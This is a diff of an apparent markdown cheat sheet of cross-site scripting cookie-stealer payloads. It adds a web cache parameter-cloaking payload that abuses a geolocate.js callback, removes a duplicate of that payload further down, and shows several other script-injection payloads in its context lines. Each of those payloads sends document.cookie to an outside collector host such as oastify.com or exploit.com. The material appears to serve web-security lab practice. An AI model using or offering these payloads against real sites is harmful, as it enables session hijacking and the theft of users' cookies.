@@ -43,6 +43,12 @@ ${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cooki
 a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
 ```  
 
+>Web Cache Parameter cloaking - script ```/js/geolocate.js```, executing the callback function ```setCountryCookie()```  
+  
+```JavaScript
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
+```  
+
 >More Cross-Site Scripting (XSS) example cookie stealer payloads.  
 
 ```JavaScript
@@ -61,10 +67,6 @@ document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.
 
 ```Javascript
 /?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script> 
-```
-
-```Javascript
-GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
 ```
 
 ```Javascript
